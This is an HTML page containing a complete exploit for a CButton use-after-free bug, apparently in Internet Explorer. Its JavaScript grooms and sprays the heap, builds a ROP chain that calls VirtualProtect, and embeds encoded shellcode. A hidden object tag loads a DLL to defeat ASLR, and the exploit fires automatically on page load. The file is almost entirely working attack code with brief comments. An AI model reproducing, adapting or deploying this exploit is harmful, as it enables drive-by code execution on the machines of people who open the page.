<!doctype html>
<html>
<head>
<script>
	var buttonSize = 0x58;
	var call1Offset = 0xDC;
	var call2Offset = 0x100;
	var heapBlocks = Array(100);
	var string = null;
	var shellcode = unescape("%uec83%u9064%u98b8%u5528%uda45%ud9c9%u2474%u31f4%ub1c9%u5b33%u4331%u8313%ufceb%u4303%uca97%ub9a0%u834f%u424b%uf48f%ua7c2%u26be%uacb0%uf692%ue1b2%u7c1e%u1196%uf095%u153f%ube1e%u1819%u0e9f%uf6a6%u1063%u055a%uf2b7%uc663%uf3ca%u3ba4%ua124%u377d%u5696%u0509%u562a%u01dd%u2012%ud558%u9ae6%u0663%u9056%ube2c%ufedd%ubf8c%u1d32%uf6f0%ud63f%u0882%u26e9%u3b6a%ue5d5%uf355%uf4d8%u3492%u8302%u46e8%u94bf%u342a%u101b%u9eaf%u82e8%u1e0b%u543d%u2cdf%u128a%u3087%uf60d%u4db3%uf986%uc413%udddc%u8cb7%u7c87%u68e1%u8066%ud5f1%u24d7%uf779%u5e0c%u9220%ud2d3%udb5e%uecd3%u4c60%uddbb%u03eb%ue1bc%u6039%ua832%uc160%u75da%u53f1%u8587%u972f%u05b1%u68da%u1546%u6daf%u9103%u1c43%u741c%ub364%u5d1d%u5207%u3d8d%uf1e6%ua735%uf3f6");


	// ROP Specific addresses
	var stackPivot = 0x63f0575b;
	var addESP = 0x63f02907;
	var virtualProtect = 0x63f04cfa;
	var heapBlock = 0x07d00000;

	// function: pack
	// 		packs given numbers as little endian strings
	// @param: nums
	// 		numbers to be packed
	function pack(nums) {
		var bytes = [];
		for (var i = 0; i < nums.length; i++) {
			bytes.push( nums[i] & 0xffff );
			bytes.push( (nums[i] & 0xffff0000) >> 16 );
		}
		return String.fromCharCode.apply(null, bytes);
	}

	// function: createString
	//		creates string of size length
	// @param: chars
	//		characters to build the string with
	// @param: nBytes
	//		the number of bytes to make the resulting string
	function createString(chars, nBytes) {
    	var a = "";
    	while ( a.length < ((nBytes - (chars.length * 2)) / 2) ) {
        	a += chars;
    	}
    	return a;
	}

	// function: lfh
	//		defragments the heap with the given javascript type
	// @param: elType
	//		javascript type to defragment heap
	function lfh(elType) {
		CollectGarbage();
		for (var i = 0; i < 20; i++) {
        	document.createElement(elType); 
    	}
	}

	// function: heapspray
	// 		sprays data on heap in MB blocks in order
	//		to land payload at a predictable address
	// @param: payload
	//		data to spray on the heap
	function heapspray(payload) {
	    var str = "\u4141";
	    var base = payload;

	    while ( base.length < ( 64*512 ) )
	        base += str;

	    sixtyFourKB = base.substr(0, 64*512);

	    var mbBlock = "";
	    var headerSize = 0x34/2;

	    var count = 0;
	    while (count++ < 15) {
	        mbBlock += sixtyFourKB;
	    }

	    mbBlock += sixtyFourKB.substr(0, sixtyFourKB.length - headerSize);

	    count = 0;
	    while (count++ < 100) {
	        heapBlocks[count] = mbBlock.substr(0, mbBlock.length);
	    }
	}

	// function sparyROPChain
	// 		creates ROP chain and sprays it on the heap
	//		at predictable addresses
	function sprayROPChain() {
		var ropChain = pack([
			virtualProtect, 	// VirtualProtect
			heapBlock,			// Heap block to make exec
			0xffff,				// How many bytes to make exec
			0x40,				// Exec specifier
			heapBlock + 0x4000,	// Garbage addr
			heapBlock,			// Garbage addr
			heapBlock + 0x128	// Shellcode address
		]);

		var payload =  "\ubabe\ucafe" + ropChain;
			// stack pivot gets called with "call [eax + 0xdc]"
			payload += createString("\udead", call1Offset - (payload.length * 2) + 2);
			payload += pack([stackPivot]);

			// "add esp, 8" gets called with "call [eax + 0x100]"
			payload += createString("\ubeef", call2Offset - (payload.length * 2) + 2);
			payload += pack([addESP]);

			// shellcode to be executed once VirtualProtect makes heap block
			// executable
			payload += shellcode;

		heapspray(payload);
	}

	// function: trigger
	//		triggers CButton UAF bug and exploits it
	//		with a ROP chain
	function trigger() {
		string = createString(pack([heapBlock + 0x24]), buttonSize);	
															// 0x07d00024 is an address that is located on the heap
															// and will most likely always hold our rop chain
		tForm = document.getElementById("form");
		tDiv = document.getElementById("div");
		
		lfh("button");										// Defragments the heap

		sprayROPChain();

		tDiv.appendChild(document.createElement('button')); // Add a CButton to the div
		tDiv.firstChild.applyElement(tForm);				// Set CButton's parent to be the form

		tDiv.innerHTML = "";								// Removes CButton from the div (form still references CButton)
		tDiv.appendChild(document.createElement('body'));   // Adds body to div
		CollectGarbage();									// Collecting garbage frees the CButton

		tDiv.className = string.substr(0);					// Allocate an object that is the same size
															// as CButton
	}

</script>
</head>
<body onload="eval(trigger())">
	<div id="div"></div>
	<form id="form">
	</form>
	<object style="display:none" classid="defeatASLR.dll#Foo"></object>
</body>
</html>
